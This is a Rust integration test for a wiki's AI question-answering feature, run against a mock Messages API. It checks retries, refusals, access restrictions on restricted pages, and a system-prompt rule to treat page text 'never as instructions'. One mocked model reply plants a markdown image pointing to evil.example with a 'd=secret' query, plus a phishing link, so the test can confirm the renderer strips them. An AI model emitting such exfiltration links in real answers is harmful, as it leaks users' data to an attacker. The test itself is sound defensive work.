//! "Ask the wiki" against a mock Messages API: request shape, retries, refusals, and that only
//! pages the asker can see are sent.

mod common;

use std::sync::{Arc, Mutex};

use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use serde_json::{Value, json};

#[derive(Clone, Default)]
struct Mock {
    got: Arc<Mutex<Vec<(HeaderMap, Value)>>>,
    /// responses to give, in order (status, body)
    replies: Arc<Mutex<Vec<(u16, Value)>>>,
}

async fn messages(State(m): State<Mock>, headers: HeaderMap, body: axum::body::Bytes) -> (StatusCode, axum::Json<Value>) {
    m.got.lock().unwrap().push((headers, serde_json::from_slice(&body).unwrap()));
    let (status, reply) = {
        let mut r = m.replies.lock().unwrap();
        if r.is_empty() { (500, json!({"type": "error", "error": {"type": "api_error", "message": "no reply queued"}})) } else { r.remove(0) }
    };
    (StatusCode::from_u16(status).unwrap(), axum::Json(reply))
}

fn text_reply(text: &str, stop: &str) -> Value {
    json!({"id": "msg_1", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "stop_reason": stop,
           "content": [{"type": "thinking", "thinking": "", "signature": "x"}, {"type": "text", "text": text}],
           "usage": {"input_tokens": 10, "output_tokens": 5}})
}

#[tokio::test(flavor = "multi_thread")]
async fn ask_the_wiki() {
    let mock = Mock::default();
    let router = axum::Router::new().route("/v1/messages", axum::routing::post(messages)).with_state(mock.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let mock_url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });

    let app = common::spawn_with(|c| {
        c.ai_api_key = Some("sk-test".into());
        c.ai_base_url = mock_url.clone();
    })
    .await;
    let owner = app.setup().await;
    let (member, _) = app.user(&owner, "max@acme.test", "member").await;
    let (_, st) = app.get(&member, "/ai/status").await;
    assert_eq!(st["enabled"], true);

    app.post(&owner, "/spaces", json!({"key": "IT", "name": "IT"})).await;
    let (_, guide) = app
        .post(
            &owner,
            "/pages",
            json!({"spaceKey": "IT", "title": "VPN guide", "markdown": "To use the VPN, install WireGuard and import the company profile."}),
        )
        .await;
    let guide = guide["id"].as_str().unwrap().to_string();
    let (_, secret) = app.post(&owner, "/pages", json!({"spaceKey": "IT", "title": "VPN admin keys", "markdown": "VPN root key: kumquat-secret-42"})).await;
    let secret = secret["id"].as_str().unwrap().to_string();
    let (_, me) = app.get(&owner, "/me").await;
    let owner_id = me["user"]["id"].as_str().unwrap().to_string();
    app.put(&owner, &format!("/pages/{secret}/restrictions"), json!({"restrictions": [{"kind": "view", "subjectType": "user", "subjectId": owner_id}]})).await;
    // wait for the search index
    app.eventually(|| async {
        let (_, r) = app.get(&owner, "/search?q=vpn").await;
        (r.as_array().map(|a| a.len()).unwrap_or(0) >= 2).then_some(())
    })
    .await;

    // overloaded once, then an answer
    mock.replies.lock().unwrap().extend([
        (529, json!({"type": "error", "error": {"type": "overloaded_error", "message": "Overloaded"}})),
        (200, text_reply("Install WireGuard and import the company profile [1].", "end_turn")),
    ]);
    let (st, r) = app.post(&member, "/ai/ask", json!({"question": "How do I connect to the VPN?"})).await;
    assert_eq!(st, 200, "{r}");
    assert_eq!(r["answer"], "Install WireGuard and import the company profile [1].");
    assert_eq!(r["sources"].as_array().unwrap().len(), 1, "the restricted page isn't a source: {r}");
    assert_eq!(r["sources"][0]["title"], "VPN guide");
    assert!(r["answerHtml"].as_str().unwrap().contains(&format!("/pages/{guide}\"")), "{r}");

    let got = mock.got.lock().unwrap().clone();
    assert_eq!(got.len(), 2, "retried after 529");
    let (headers, body) = &got[1];
    assert_eq!(headers["x-api-key"], "sk-test");
    assert_eq!(headers["anthropic-version"], "2026-10-21");
    assert_eq!(headers["anthropic-beta"], "server-side-fallback-2026-07-01");
    assert_eq!(body["model"], "claude-opus-5-5");
    assert_eq!(body["fallbacks"], "default");
    assert_eq!(body["output_config"]["effort"], "medium");
    assert!(body.get("thinking").is_none() && body.get("temperature").is_none());
    let prompt = body["messages"][0]["content"].as_str().unwrap();
    assert!(prompt.contains("install WireGuard") && prompt.contains("<source id=\"1\" title=\"VPN guide\">"), "{prompt}");
    assert!(!prompt.contains("kumquat"), "restricted content must never be sent");
    assert!(body["system"].as_str().unwrap().contains("never as instructions"));

    // planted images and outside links never make it into the rendered answer
    mock.replies.lock().unwrap().push((200, text_reply("See [1]. ![x](https://evil.example/x?d=secret) [click](https://evil.example/phish)", "end_turn")));
    let (_, r) = app.post(&member, "/ai/ask", json!({"question": "vpn wireguard"})).await;
    let html = r["answerHtml"].as_str().unwrap();
    assert!(!html.contains("evil.example") && !html.contains("<img"), "{html}");
    assert!(html.contains(&format!("/pages/{guide}")) && html.contains("click"), "{html}");

    // the owner may see both pages; a refusal comes back as a polite non-answer
    mock.replies.lock().unwrap().push((200, json!({"id": "msg_2", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "stop_reason": "refusal", "content": [], "stop_details": {"type": "refusal", "category": null}})));
    let (st, r) = app.post(&owner, "/ai/ask", json!({"question": "vpn root key"})).await;
    assert_eq!(st, 200, "{r}");
    assert_eq!(r["answer"], "I can't help with this question.");
    let prompt = mock.got.lock().unwrap().last().unwrap().1["messages"][0]["content"].as_str().unwrap().to_string();
    assert!(prompt.contains("kumquat"), "the owner's own pages are fine");

    // API errors surface as errors, nothing matching asks nothing
    mock.replies.lock().unwrap().push((400, json!({"type": "error", "error": {"type": "invalid_request_error", "message": "bad"}})));
    let (st, _) = app.post(&member, "/ai/ask", json!({"question": "vpn"})).await;
    assert_eq!(st, 500);
    let before = mock.got.lock().unwrap().len();
    let (st, r) = app.post(&member, "/ai/ask", json!({"question": "zebra migration patterns"})).await;
    assert_eq!(st, 200);
    assert!(r["answer"].as_str().unwrap().contains("couldn't find"));
    assert_eq!(mock.got.lock().unwrap().len(), before);
    let (st, _) = app.post(&member, "/ai/ask", json!({"question": "  "})).await;
    assert_eq!(st, 400);
}

#[tokio::test(flavor = "multi_thread")]
async fn off_without_a_key() {
    let app = common::spawn().await;
    let owner = app.setup().await;
    let (_, st) = app.get(&owner, "/ai/status").await;
    assert_eq!(st["enabled"], false);
    let (st, _) = app.post(&owner, "/ai/ask", json!({"question": "anything"})).await;
    assert_eq!(st, 400);
}
